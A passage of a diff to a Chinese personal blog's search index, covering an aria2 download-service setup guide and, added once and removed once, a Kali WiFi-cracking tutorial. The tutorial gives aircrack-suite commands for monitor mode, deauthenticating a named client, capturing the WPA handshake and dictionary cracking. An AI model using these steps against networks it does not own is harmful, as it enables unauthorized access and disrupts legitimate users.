本地节点查找，PT需要禁用，默认:false</span></span><br><span class="line"><span class="comment">#bt-enable-lpd=false</span></span><br><span class="line"> </span><br><span class="line"><span class="comment"># 种子交换，PT需要禁用，默认:true</span></span><br><span class="line">enable-peer-exchange=<span class="literal">false</span></span><br><span class="line"> </span><br><span class="line"><span class="comment"># BT 下载期望速度值（单任务），运行时可修改</span></span><br><span class="line"><span class="comment"># 单位 K 或 M，默认：50K</span></span><br><span class="line"><span class="comment"># 下载速度低于此选项值时会临时提高连接数来获得更快的下载速度，不过前提是有更多的做种者可供连接</span></span><br><span class="line"><span class="comment"># 实测临时提高连接数没有上限，但不会像不做限制一样无限增加，会根据算法进行合理的动态调节</span></span><br><span class="line">bt-request-peer-speed-limit=5M</span><br><span class="line"> </span><br><span class="line"><span class="comment"># 客户端伪装，PT需要</span></span><br><span class="line">peer-id-prefix=-TR2770-</span><br><span class="line">user-agent=Transmission/2.77</span><br><span class="line"> </span><br><span class="line"><span class="comment"># 最小分享率。当种子的分享率达到此选项设置的值时停止做种</span></span><br><span class="line"><span class="comment"># 0 为一直做种, 默认：1.0</span></span><br><span class="line"><span class="comment"># 强烈建议将此选项设置为大于等于 1.0</span></span><br><span class="line">seed-ratio=1.0</span><br><span class="line"> </span><br><span class="line"><span class="comment"># 最小做种时间（分钟）</span></span><br><span class="line"><span class="comment"># 设置为 0 时将在 BT 任务下载完成后停止做种</span></span><br><span class="line">seed-time=30</span><br><span class="line"> </span><br><span class="line"><span class="comment"># 做种前检查文件哈希，默认：true</span></span><br><span class="line">bt-hash-check-seed=<span class="literal">true</span></span><br><span class="line"> </span><br><span class="line"><span class="comment"># 强制保存会话，即使任务已经完成，默认:false</span></span><br><span class="line"><span class="comment"># 较新的版本开启后会在任务完成后依然保留.aria2文件</span></span><br><span class="line"><span class="comment">#force-save=false</span></span><br><span class="line"> </span><br><span class="line"><span class="comment"># 继续之前的BT任务时，无需再次校验，默认：false</span></span><br><span class="line">bt-seed-unverified=<span class="literal">true</span></span><br><span class="line"> </span><br><span class="line"><span class="comment"># 保存磁力链接元数据为种子文件(.torrent文件)，默认：false</span></span><br><span class="line">bt-save-metadata=<span class="literal">true</span></span><br><span class="line"> </span><br><span class="line"><span class="comment"># BT tracker 服务器连接超时时间（秒）。默认：60</span></span><br><span class="line"><span class="comment"># 建立连接后，此选项无效，将使用 bt-tracker-timeout 选项的值</span></span><br><span class="line">bt-tracker-connect-timeout=45</span><br><span class="line"> </span><br><span class="line"><span class="comment"># BT tracker 服务器超时时间（秒）。默认：60</span></span><br><span class="line">bt-tracker-timeout=45</span><br><span class="line"> </span><br><span class="line"><span class="comment"># 保存通过 WebUI(RPC) 上传的种子文件(.torrent)，默认：true</span></span><br><span class="line"><span class="comment"># 所有涉及种子文件保存的选项都建议开启，不保存种子文件有任务丢失的风险</span></span><br><span class="line"><span class="comment"># 通过 RPC 自定义临时下载目录可能不会保存种子文件</span></span><br><span class="line">rpc-save-upload-metadata=<span class="literal">true</span></span><br><span class="line"> </span><br><span class="line"><span class="comment"># BT强制加密, 默认: false</span></span><br><span class="line"><span class="comment"># 启用后将拒绝旧的 BT 握手协议并仅使用混淆握手及加密</span></span><br><span class="line"><span class="comment"># 可以解决部分运营商对 BT 下载的封锁，且有一定的防版权投诉与迅雷吸血效果</span></span><br><span class="line"><span class="comment"># 此选项相当于后面两个选项(bt-require-crypto=true, bt-min-crypto-level=arc4)的快捷开启方式，但不会修改这两个选项的值</span></span><br><span class="line">bt-force-encryption=<span class="literal">true</span></span><br><span class="line"> </span><br><span class="line"><span class="comment"># BT加密需求，默认：false</span></span><br><span class="line"><span class="comment"># 启用后拒绝与旧的 BitTorrent 握手协议(\19BitTorrent protocol)建立连接，始终使用混淆处理握手。</span></span><br><span class="line"><span class="comment">#bt-require-crypto=true</span></span><br><span class="line"> </span><br><span class="line"><span class="comment"># BT最低加密等级，可选：plain（明文），arc4（加密），默认：plain</span></span><br><span class="line"><span class="comment">#bt-min-crypto-level=arc4</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">### 高级选项 ###</span></span><br><span class="line"> </span><br><span class="line"><span class="comment"># 启用异步 DNS 功能，默认：true</span></span><br><span class="line">async-dns=<span class="literal">true</span></span><br><span class="line"> </span><br><span class="line"><span class="comment"># 指定异步 DNS 服务器列表，未指定则从 /etc/resolv.conf 中读取。</span></span><br><span class="line">async-dns-server=119.29.29.29,223.5.5.5,1.1.1.1,8.8.8.8,114.114.114.114</span><br><span class="line"> </span><br><span class="line"><span class="comment"># 指定单个网络接口，可能的值：接口，IP地址，主机名</span></span><br><span class="line"><span class="comment"># 如果接口具有多个 IP 地址，则建议指定 IP 地址。</span></span><br><span class="line"><span class="comment"># 已知指定网络接口会影响依赖本地 RPC 的连接的功能场景，即通过 localhost 和 127.0.0.1 无法与 Aria2 服务端进行讯通。</span></span><br><span class="line"><span class="comment">#interface=</span></span><br><span class="line"> </span><br><span class="line"><span class="comment"># 指定多个网络接口，多个值之间使用逗号(,)分隔。</span></span><br><span class="line"><span class="comment"># 使用 interface 选项时会忽略此项。</span></span><br><span class="line"><span class="comment">#multiple-interface=</span></span><br></pre></td></tr></table></figure>
-
-<p>以上配置文件可以全选复制保存，只需要额外注意以下几项配置，根据自己的情况进行更改：</p>
-<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">dir = 下载路径</span><br><span class="line">log = 日志 Aria2.log 文件的保存路径</span><br><span class="line">input-file = 读取下载任务的 aria2.session 文件路径</span><br><span class="line">save-session = 会话 aria2.session 文件保存路径</span><br><span class="line">file-allocation = 文件预分配模式 none|prealloc|trunc|falloc</span><br><span class="line">rpc-secret = 自定义的 RPC 授权密钥</span><br></pre></td></tr></table></figure>
-
-<p>配置文件全部改好保存后，打开终端<code>PowerShell.exe</code>，执行以下命令查看配置是否生效：</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 进入 Aria2 核心文件目录</span></span><br><span class="line"><span class="built_in">cd</span> C:\others\aria2</span><br><span class="line"><span class="comment"># 根据刚才保存的配置运行 Aria2</span></span><br><span class="line">./aria2c.exe --conf-path=aria2.conf</span><br></pre></td></tr></table></figure>
-
-<p>当终端显示以下信息后，则表示 Aria2 运行成功：</p>
-<p><img src="https://raw.githubusercontent.com/movejian/images/main/movejian/images202301262322081.png" alt="img"></p>
-<h3 id="安装-Win10-PC-端的-Aria2-客户端-AriaNg-Native（我们来给Aria2添加一个界面，方便操作）"><a href="#安装-Win10-PC-端的-Aria2-客户端-AriaNg-Native（我们来给Aria2添加一个界面，方便操作）" class="headerlink" title="安装 Win10 PC 端的 Aria2 客户端 AriaNg Native（我们来给Aria2添加一个界面，方便操作）"></a>安装 Win10 PC 端的 Aria2 客户端 AriaNg Native（我们来给Aria2添加一个界面，方便操作）</h3><p>客户端 AriaNg Native 的下载地址：</p>
-<p><a href="https://github.com/mayswind/AriaNg-Native/releases">https://github.com/mayswind/AriaNg-Native</a></p>
-<p>选择对应系统的版本进行下载，这里我选择的是64位绿色解压版：</p>
-<p><img src="https://raw.githubusercontent.com/movejian/images/main/movejian/images202301262322498.png" alt="img"></p>
-<p>客户端使用非常简单，将下载下来的压缩包解压后保存到任意位置，然后双击<code>AriaNg Native.exe</code>即可运行程序。</p>
-<p>程序打开后，我们还需要进行配置，让客户端和程序核心进行链接，如图：</p>
-<p><img src="https://raw.githubusercontent.com/movejian/images/main/movejian/images202301262324095.png" alt="img"></p>
-<p><img src="https://raw.githubusercontent.com/movejian/images/main/movejian/images202301262324225.png" alt="img"></p>
-<p>看到<code>已链接</code>字样则表示成功。</p>
-<h3 id="设置后台静默启动-Aria2"><a href="#设置后台静默启动-Aria2" class="headerlink" title="设置后台静默启动 Aria2"></a>设置后台静默启动 Aria2</h3><p>截至到以上设置，虽然可以正常使用，但是每次都需要手动打开终端运行核心文件，且还要一直保持终端运行，始终不太方便，因此可以使用<code>WinSW</code>这个工具进行以下配置，让电脑每次开机后自动在后台运行，我们要用的时候只用打开客户端即可。</p>
-<p>WinSw 下载地址：</p>
-<p><a href="https://github.com/winsw/winsw/releases">https://github.com/winsw/winsw</a></p>
-<p>这里我选择64位版本，并一并下载配置 .xml 的模板文件：</p>
-<p><img src="https://raw.githubusercontent.com/movejian/images/main/movejian/images202301262324643.png" alt="img"></p>
-<p>选择任意位置创建一个文件夹，比如命名为<code>WinSW-Aria2c</code>，将刚才下载的<code>WinSW-x64.exe</code>和<code>sample-minimal.xml</code>文件放到新建的文件夹里，然后用文本编辑器打开<code>sample-minimal.xml</code>，对配置进行修改：</p>
-<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">service</span>&gt;</span></span><br><span class="line"> </span><br><span class="line">  <span class="comment">&lt;!-- 系统进程中显示的服务ID--&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">id</span>&gt;</span>Aria2<span class="tag">&lt;/<span class="name">id</span>&gt;</span></span><br><span class="line">  <span class="comment">&lt;!-- 服务名称 --&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">name</span>&gt;</span>Aria2后台运行<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">  <span class="comment">&lt;!-- 这里是要运行服务的介绍，随便写 --&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">description</span>&gt;</span>Aria2后台运行服务随开机自启动<span class="tag">&lt;/<span class="name">description</span>&gt;</span></span><br><span class="line"> </span><br><span class="line">  <span class="comment">&lt;!-- 需要执行的命令内容 --&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">executable</span>&gt;</span>C:\others\aria2\aria2c.exe<span class="tag">&lt;/<span class="name">executable</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">arguments</span>&gt;</span>--conf-path=C:\others\aria2\aria2.conf<span class="tag">&lt;/<span class="name">arguments</span>&gt;</span></span><br><span class="line"> </span><br><span class="line">  <span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">       可以定义一系列操作，如果托管可执行文件失败，则应执行以下操作：</span></span><br><span class="line"><span class="comment">       restart 服务重启</span></span><br><span class="line"><span class="comment">       reboot 系统重启</span></span><br><span class="line"><span class="comment">       none 无</span></span><br><span class="line"><span class="comment">  --&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">onfailure</span> <span class="attr">action</span>=<span class="string">&quot;restart&quot;</span> <span class="attr">delay</span>=<span class="string">&quot;60 sec&quot;</span>/&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">onfailure</span> <span class="attr">action</span>=<span class="string">&quot;restart&quot;</span> <span class="attr">delay</span>=<span class="string">&quot;120 sec&quot;</span>/&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">logmode</span>&gt;</span>reset<span class="tag">&lt;/<span class="name">logmode</span>&gt;</span></span><br><span class="line"> </span><br><span class="line"><span class="tag">&lt;/<span class="name">service</span>&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>修改好后，将<code>.exe</code>和<code>.xml</code>的文件名改成统一名称，格式后缀不要改动，然后<strong>以管理员身份运行</strong>终端<code>PowerShell.exe</code>，执行以下指令：</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">.\WinSW-Aria2c.exe install </span><br></pre></td></tr></table></figure>
-
-<p>如下图所示，就表示后台自启动服务已经安装成功：</p>
-<p><img src="https://raw.githubusercontent.com/movejian/images/main/movejian/images202301262325544.png" alt="img"></p>
-<p>然后按键盘<code>Win</code>+<code>r</code>快捷键打开运行界面，输入<code>services.msc</code>进入服务列表，如图所示：</p>
-<p><img src="https://raw.githubusercontent.com/movejian/images/main/movejian/images202301262326157.png" alt="img"></p>
-<p>找到 Aria2 服务，双击打开服务详情，然后点击<code>启动</code>：</p>
-<p><img src="https://raw.githubusercontent.com/movejian/images/main/movejian/images202301262326770.png" alt="img"></p>
-<p>以后每次电脑开机后都会默默的后台运行，省心又方便。</p>
-]]></content>
-      <categories>
-        <category>技术</category>
-        <category>Win</category>
-      </categories>
-      <tags>
-        <tag>Aria2</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>【安装Office】 Office Tool Plus 入门教程</title>
     <url>/2022/09/27/%E5%AE%89%E8%A3%85Office/</url>
     <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>安装 Office 是一件非常简单的事情，大家不必过于担心，更不必对自己没有信心。<br>本教程适用于需要全新安装 Office 的用户，若您需要修改 Office 请参阅 [<a href="https://movejian.github.io/2022/09/27/%E6%8A%80%E8%83%BD%E6%89%A9%E5%B1%95Office">技能扩展] Office Tool Plus 高级教程</a><br>任何人都可使用 Office Tool Plus 轻松地安装 Office，请认真阅读教程以避免因为疏忽出现问题。<br>如无特殊情况，文章中提到的 Windows 10 也适用于 Windows 11.</p>
@@ -1340,6 +1380,65 @@
       </tags>
   </entry>
   <entry>
+    <title>实战kali破解wifi密码 全网最详细的保姆级教程</title>
+    <url>/2022/09/21/%E5%AE%9E%E6%88%98kali%E7%A0%B4%E8%A7%A3wifi%E5%AF%86%E7%A0%81/</url>
+    <content><![CDATA[<h2 id="kali官网"><a href="#kali官网" class="headerlink" title="kali官网"></a>kali官网</h2><hr>
+<p>kali是什么？<br> ——kali就是一个专门用于渗透行业的Linux发行版本，里面的工具非常丰富，本文就是建立在kali系统的支持之上的</p>
+<p><a href="https://www.kali.org/get-kali/#kali-virtual-machines">https://www.kali.org/get-kali/#kali-virtual-machines</a></p>
+<p>下载了vm文件后可以直接用VMware打开，开机后(在Kali系统里所有默认ID和密码都为kali)<br> <strong>用户名：kali<br> 密码：kali</strong></p>
+<span id="more"></span>
+
+<h2 id="正式开始"><a href="#正式开始" class="headerlink" title="正式开始"></a>正式开始</h2><h3 id="查看已安装网卡"><a href="#查看已安装网卡" class="headerlink" title="查看已安装网卡"></a>查看已安装网卡</h3><p>以下的操作都需要提升权限，默认的root密码都是kali</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">#提升权限</span><br><span class="line">sudo su</span><br><span class="line">#查看网卡</span><br><span class="line">airmon-ng</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/movejian/images/main/movejian/images202209210428371.png"><br> 如果没有，请注意是否开启了网卡在虚拟机的连接，如下图<br><img src="https://raw.githubusercontent.com/movejian/images/main/movejian/images202209210430334.png"></p>
+<p>打开一个终端窗口</p>
+<h3 id="开启网卡监控"><a href="#开启网卡监控" class="headerlink" title="开启网卡监控"></a>开启网卡监控</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">#开启网卡监控</span><br><span class="line">airmon-ng start wlan0</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/movejian/images/main/movejian/images202209210431501.png"><br> 可以使用命令看看网卡的名字是否改变</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">ifconfig</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/movejian/images/main/movejian/images202209210431574.png"><br> 可以看到最后的那个名字已经改变</p>
+<h3 id="扫描wifi"><a href="#扫描wifi" class="headerlink" title="扫描wifi"></a>扫描wifi</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">airodump-ng wlan0mon</span><br></pre></td></tr></table></figure>
+
+<p>我们选择这个名叫adcd的wifi进行破解<br> <img src="https://raw.githubusercontent.com/movejian/images/main/movejian/images202209210431426.png"></p>
+<h3 id="等待抓取握手包"><a href="#等待抓取握手包" class="headerlink" title="等待抓取握手包"></a>等待抓取握手包</h3><p>上述方法后，按<code>ctrl+c</code>，退出扫描</p>
+<p>输入命令</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">airodump-ng -w freedom -c <span class="number">11</span> --bssid 9C:2E:A1:<span class="number">20</span>:<span class="number">65</span>:BC wlan0mon -ignore-nefative-oneaa</span><br></pre></td></tr></table></figure>
+
+<p>-c：指定信道<br> -w：指定抓去握手包的存放位置或者名字，freedom是一会抓去的握手包的名字<br> –bssid：指定路由器的MAC</p>
+<p>需要更改两个参数，信道和地址，这两个参数分别是扫描wifi时确定要破解的wifi参数</p>
+<p><img src="https://raw.githubusercontent.com/movejian/images/main/movejian/images202209210431403.png">]</p>
+<p><img src="https://raw.githubusercontent.com/movejian/images/main/movejian/images202209210432076.png"><br> 回车后，如下界面<br> <img src="https://raw.githubusercontent.com/movejian/images/main/movejian/images202209210432332.png"><br> 从这个界面可以看出，选定的wifi一共有一个人连接，没有人连接的wifi是无法破解的</p>
+<h3 id="爆破-抓取握手包"><a href="#爆破-抓取握手包" class="headerlink" title="爆破 抓取握手包"></a>爆破 抓取握手包</h3><p>这个步骤，说白了，就是将一个用户踢下线，让他重新连接WIFI，这样我们就能监听并且截取到握手包</p>
+<p>重启一个终端窗口，一样的，申请管理员权限，密码默认：kali</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">sudo su</span><br></pre></td></tr></table></figure>
+
+<p>执行如下命令，同样的，需要输入上一步的两个参数，一个客户机的MAC，和路由器的MAC</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">aireplay-ng -<span class="number">0</span> <span class="number">2</span> -a 9C:2E:A1:<span class="number">20</span>:<span class="number">65</span>:BC -c A4:<span class="number">50</span>:<span class="number">46</span>:D8:<span class="number">74</span>:<span class="number">29</span> wlan0mon</span><br></pre></td></tr></table></figure>
+
+<p>-a：指定路由器的MAC<br> -c：指定客户机的MAC</p>
+<p><img src="https://raw.githubusercontent.com/movejian/images/main/movejian/images202209210432483.png"><br> 执行成功后如上图，表明该客户机以及被成功的踢下线，我们要做的就是等待客户机重新连接，他只要重新连接了，我们就能抓到握手包，进行跑字典破解</p>
+<h3 id="抓取成功"><a href="#抓取成功" class="headerlink" title="抓取成功"></a>抓取成功</h3><p>当第四步的终端窗口出现如下<br> <img src="https://raw.githubusercontent.com/movejian/images/main/movejian/images202209210432057.png"><br> 表明成功抓取到握手包，进行下一个步骤<br> <strong>注意！！这里抓到包一定要按<code>ctrl+c</code>退出抓包，不然抓到的握手包用不了哦</strong></p>
+<h3 id="开始破解"><a href="#开始破解" class="headerlink" title="开始破解"></a>开始破解</h3><p>包在<code>**/home/kali/**</code>文件夹下，找到名叫<code>freedom-01.ivs</code>文件，这个就是抓到的包</p>
+<p><img src="https://raw.githubusercontent.com/movejian/images/main/movejian/images202209210432141.png"><br> 然后就是字典，我个人建议将字典一同放在该目录下<br> <img src="https://raw.githubusercontent.com/movejian/images/main/movejian/images202209210432350.png"><br> 然后再次重起一个终端窗口，输入如下命令</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">ircrack-ng -w pass.txt freedom-*.ivs</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/movejian/images/main/movejian/images202209210432497.png"><br> 回车开始解密<br> <img src="https://raw.githubusercontent.com/movejian/images/main/movejian/images202209210432365.png"><br> <strong>能否成功看字典的是否强大，也看脸</strong></p>
+<p>成功界面<br><img src="https://raw.githubusercontent.com/movejian/images/main/movejian/images202209210433429.png"><br> 失败界面<br><img src="https://raw.githubusercontent.com/movejian/images/main/movejian/images202209210433725.png"></p>
+<h2 id="温馨提示"><a href="#温馨提示" class="headerlink" title="温馨提示"></a>温馨提示</h2><hr>
+<p><strong>kali学的好，牢饭少不了<br> 本教程仅用于学习，请大家谨慎使用</strong></p>
+<p>需要的还是度盘自提吧：<br>链接：<a href="https://pan.baidu.com/s/1hehIiGnrArFiXVkIjEudcw">https://pan.baidu.com/s/1hehIiGnrArFiXVkIjEudcw</a><br>提取码：lbxk</p>
+<p><img src="https://raw.githubusercontent.com/movejian/images/main/movejian/images202209210436725.png"></p>
+]]></content>
+      <categories>
+        <category>学习</category>
+      </categories>
+      <tags>
+        <tag>Kali</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>密码破解—Hashcat【RAR密码破解】</title>
     <url>/2022/11/21/%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3%E2%80%94Hashcat%E3%80%90RAR%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3%E3%80%91/</url>
     <content><![CDATA[<p>一、Hashcat简介<br>hashcat号称世界上最快的密码破解，世界上第一个唯一的基于GPU、CPU规则引擎，免费多GPU（高达128个GPU），多哈希，多操作系统（Linux和Windows本地二进制文件），多平台（OpenCL和CUDA支持），多算法，资源利用率低，基于字典攻击，支持分布式破解等等，hashcat目前支持各类公开算法高达247类，市面上面公开的密码加密算法基本都支持！</p>
@@ -1410,65 +1509,6 @@
 ]]></content>
   </entry>
   <entry>
-    <title>实战kali破解wifi密码 全网最详细的保姆级教程</title>
-    <url>/2022/09/21/%E5%AE%9E%E6%88%98kali%E7%A0%B4%E8%A7%A3wifi%E5%AF%86%E7%A0%81/</url>
-    <content><![CDATA[<h2 id="kali官网"><a href="#kali官网" class="headerlink" title="kali官网"></a>kali官网</h2><hr>
-<p>kali是什么？<br> ——kali就是一个专门用于渗透行业的Linux发行版本，里面的工具非常丰富，本文就是建立在kali系统的支持之上的</p>
-<p><a href="https://www.kali.org/get-kali/#kali-virtual-machines">https://www.kali.org/get-kali/#kali-virtual-machines</a></p>
-<p>下载了vm文件后可以直接用VMware打开，开机后(在Kali系统里所有默认ID和密码都为kali)<br> <strong>用户名：kali<br> 密码：kali</strong></p>
-<span id="more"></span>
-
-<h2 id="正式开始"><a href="#正式开始" class="headerlink" title="正式开始"></a>正式开始</h2><h3 id="查看已安装网卡"><a href="#查看已安装网卡" class="headerlink" title="查看已安装网卡"></a>查看已安装网卡</h3><p>以下的操作都需要提升权限，默认的root密码都是kali</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">#提升权限</span><br><span class="line">sudo su</span><br><span class="line">#查看网卡</span><br><span class="line">airmon-ng</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://raw.githubusercontent.com/movejian/images/main/movejian/images202209210428371.png"><br> 如果没有，请注意是否开启了网卡在虚拟机的连接，如下图<br><img src="https://raw.githubusercontent.com/movejian/images/main/movejian/images202209210430334.png"></p>
-<p>打开一个终端窗口</p>
-<h3 id="开启网卡监控"><a href="#开启网卡监控" class="headerlink" title="开启网卡监控"></a>开启网卡监控</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">#开启网卡监控</span><br><span class="line">airmon-ng start wlan0</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://raw.githubusercontent.com/movejian/images/main/movejian/images202209210431501.png"><br> 可以使用命令看看网卡的名字是否改变</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">ifconfig</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://raw.githubusercontent.com/movejian/images/main/movejian/images202209210431574.png"><br> 可以看到最后的那个名字已经改变</p>
-<h3 id="扫描wifi"><a href="#扫描wifi" class="headerlink" title="扫描wifi"></a>扫描wifi</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">airodump-ng wlan0mon</span><br></pre></td></tr></table></figure>
-
-<p>我们选择这个名叫adcd的wifi进行破解<br> <img src="https://raw.githubusercontent.com/movejian/images/main/movejian/images202209210431426.png"></p>
-<h3 id="等待抓取握手包"><a href="#等待抓取握手包" class="headerlink" title="等待抓取握手包"></a>等待抓取握手包</h3><p>上述方法后，按<code>ctrl+c</code>，退出扫描</p>
-<p>输入命令</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">airodump-ng -w freedom -c <span class="number">11</span> --bssid 9C:2E:A1:<span class="number">20</span>:<span class="number">65</span>:BC wlan0mon -ignore-nefative-oneaa</span><br></pre></td></tr></table></figure>
-
-<p>-c：指定信道<br> -w：指定抓去握手包的存放位置或者名字，freedom是一会抓去的握手包的名字<br> –bssid：指定路由器的MAC</p>
-<p>需要更改两个参数，信道和地址，这两个参数分别是扫描wifi时确定要破解的wifi参数</p>
-<p><img src="https://raw.githubusercontent.com/movejian/images/main/movejian/images202209210431403.png">]</p>
-<p><img src="https://raw.githubusercontent.com/movejian/images/main/movejian/images202209210432076.png"><br> 回车后，如下界面<br> <img src="https://raw.githubusercontent.com/movejian/images/main/movejian/images202209210432332.png"><br> 从这个界面可以看出，选定的wifi一共有一个人连接，没有人连接的wifi是无法破解的</p>
-<h3 id="爆破-抓取握手包"><a href="#爆破-抓取握手包" class="headerlink" title="爆破 抓取握手包"></a>爆破 抓取握手包</h3><p>这个步骤，说白了，就是将一个用户踢下线，让他重新连接WIFI，这样我们就能监听并且截取到握手包</p>
-<p>重启一个终端窗口，一样的，申请管理员权限，密码默认：kali</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">sudo su</span><br></pre></td></tr></table></figure>
-
-<p>执行如下命令，同样的，需要输入上一步的两个参数，一个客户机的MAC，和路由器的MAC</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">aireplay-ng -<span class="number">0</span> <span class="number">2</span> -a 9C:2E:A1:<span class="number">20</span>:<span class="number">65</span>:BC -c A4:<span class="number">50</span>:<span class="number">46</span>:D8:<span class="number">74</span>:<span class="number">29</span> wlan0mon</span><br></pre></td></tr></table></figure>
-
-<p>-a：指定路由器的MAC<br> -c：指定客户机的MAC</p>
-<p><img src="https://raw.githubusercontent.com/movejian/images/main/movejian/images202209210432483.png"><br> 执行成功后如上图，表明该客户机以及被成功的踢下线，我们要做的就是等待客户机重新连接，他只要重新连接了，我们就能抓到握手包，进行跑字典破解</p>
-<h3 id="抓取成功"><a href="#抓取成功" class="headerlink" title="抓取成功"></a>抓取成功</h3><p>当第四步的终端窗口出现如下<br> <img src="https://raw.githubusercontent.com/movejian/images/main/movejian/images202209210432057.png"><br> 表明成功抓取到握手包，进行下一个步骤<br> <strong>注意！！这里抓到包一定要按<code>ctrl+c</code>退出抓包，不然抓到的握手包用不了哦</strong></p>
-<h3 id="开始破解"><a href="#开始破解" class="headerlink" title="开始破解"></a>开始破解</h3><p>包在<code>**/home/kali/**</code>文件夹下，找到名叫<code>freedom-01.ivs</code>文件，这个就是抓到的包</p>
-<p><img src="https://raw.githubusercontent.com/movejian/images/main/movejian/images202209210432141.png"><br> 然后就是字典，我个人建议将字典一同放在该目录下<br> <img src="https://raw.githubusercontent.com/movejian/images/main/movejian/images202209210432350.png"><br> 然后再次重起一个终端窗口，输入如下命令</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">ircrack-ng -w pass.txt freedom-*.ivs</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://raw.githubusercontent.com/movejian/images/main/movejian/images202209210432497.png"><br> 回车开始解密<br> <img src="https://raw.githubusercontent.com/movejian/images/main/movejian/images202209210432365.png"><br> <strong>能否成功看字典的是否强大，也看脸</strong></p>
-<p>成功界面<br><img src="https://raw.githubusercontent.com/movejian/images/main/movejian/images202209210433429.png"><br> 失败界面<br><img src="https://raw.githubusercontent.com/movejian/images/main/movejian/images202209210433725.png"></p>
-<h2 id="温馨提示"><a href="#温馨提示" class="headerlink" title="温馨提示"></a>温馨提示</h2><hr>
-<p><strong>kali学的好，牢饭少不了<br> 本教程仅用于学习，请大家谨慎使用</strong></p>
-<p>需要的还是度盘自提吧：<br>链接：<a href="https://pan.baidu.com/s/1hehIiGnrArFiXVkIjEudcw">https://pan.baidu.com/s/1hehIiGnrArFiXVkIjEudcw</a><br>提取码：lbxk</p>
-<p><img src="https://raw.githubusercontent.com/movejian/images/main/movejian/images202209210436725.png"></p>
-]]></content>
-      <categories>
-        <category>学习</category>
-      </categories>
-      <tags>
-        <tag>Kali</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>将Windows打印机变成网络打印机</title>
     <url>/2022/09/11/%E5%B0%86Windows%E6%89%93%E5%8D%B0%E6%9C%BA%E5%8F%98%E6%88%90%E7%BD%91%E7%BB%9C%E6%89%93%E5%8D%B0%E6%9C%BA/</url>
     <content><![CDATA[<p>大家都知道Windows的打印共享一直属于玄学，2000&#x2F;XP&#x2F;2003（NT 5.x）及以前的时代基本还算正常，经过简单的设置总能搞定，自从Vista开始的NT 6.x，尤其到了win10&#x2F;win11时代，Windows的打印共享基本上就变成了玄学，姑且不说很难搞定，就算搞定了，一个补丁也可能把它搞残废。另外，Windows的共享服务一直存在各种安全漏洞，曾经一度被勒索病毒利用，尤其是win7（不能打补丁那种），为了安全，我一般都禁用server服务。</p>
@@ -1491,19 +1531,6 @@
       </categories>
       <tags>
         <tag>技术</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>愿你编码半生，归来仍是少年</title>
-    <url>/2019/10/21/%E6%84%BF%E4%BD%A0%E7%BC%96%E7%A0%81%E5%8D%8A%E7%94%9F%EF%BC%8C%E5%BD%92%E6%9D%A5%E4%BB%8D%E6%98%AF%E5%B0%91%E5%B9%B4/</url>
-    <content><![CDATA[<h4 id="Hello-World-不巧，我也在等你。"><a href="#Hello-World-不巧，我也在等你。" class="headerlink" title="Hello,World.不巧，我也在等你。"></a>Hello,World.不巧，我也在等你。</h4><p>​      有人说自己被社会磨平了棱角，泯灭了心性，受生活所迫，“都说是为生活所迫，生活缺从来没有被抓过；都说被社会磨去棱角，社会之恶至今无法逃脱”，我们都有权利选择自己想成为的人，并不是由社会说了算，我们都曾年少，我们都曾有棱角，社会的熔炉却在不断的炼化我们，到底是磨平了棱角，还是磨成了钢刀，就让时间来见证吧！</p>
-<p>​      常年混迹于各大网络社区，也曾愤青，如今独爱云淡风轻，只愿在滚滚红尘中揽得风花雪月独醉。</p>
-<h4 id="感谢你的到来。"><a href="#感谢你的到来。" class="headerlink" title="感谢你的到来。"></a>感谢你的到来。</h4><span id="more"></span>
-
-<p><img src="https://raw.githubusercontent.com/movejian/images/main/blog/images/8.jpg" alt="8"></p>
-]]></content>
-      <tags>
-        <tag>随心</tag>
       </tags>
